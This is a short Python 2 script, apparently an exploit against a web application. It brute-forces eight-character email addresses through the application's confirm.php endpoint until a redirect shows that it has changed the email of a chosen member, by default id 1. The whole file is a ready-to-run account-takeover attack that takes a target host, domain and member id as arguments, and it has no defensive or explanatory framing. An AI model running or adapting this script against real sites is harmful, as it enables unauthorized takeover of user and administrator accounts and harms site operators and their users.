#!/usr/local/bin/python


import hashlib, string, itertools, re, requests, sys
import argparse
 

def gen(Host,Domain,id_): 
	
	count = 0 
	print " [+] Host : %s " % (Host)
 	for w in itertools.imap(''.join, itertools.product(string.lowercase + string.digits, repeat=8)):
		print " [+] Email : %s@%s    " % (w,Domain)
		
		sys.stdout.write("\033[F")
		sys.stdout.write("\033[K")

		r = requests.get( "http://%s/confirm.php?e=%s@%s&id=%s&m=0" % (Host, w, Domain, id_ ), allow_redirects=False)
		count += 1
		if r.status_code == 302:
			print " [+] we set the first members email to %s@%s !" % (w,Domain)
			print " [+] made a total of %d requests" % count
			break
	



def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', dest='host',action='store', help='host Target')
	parser.add_argument('-d', '--Domain', dest='domain',action="store", help='exemple admin@Domain.com ')
	parser.add_argument('-i', '--id', dest='id',action="store", help='if none id == 1 ')
 	results = parser.parse_args()

	if results.id is not None: 
		id_ = results.id
	else:	
		id_ = "1" 
		 
 	
 	gen(results.host , results.domain , id_)






if __name__ == "__main__":
    main()
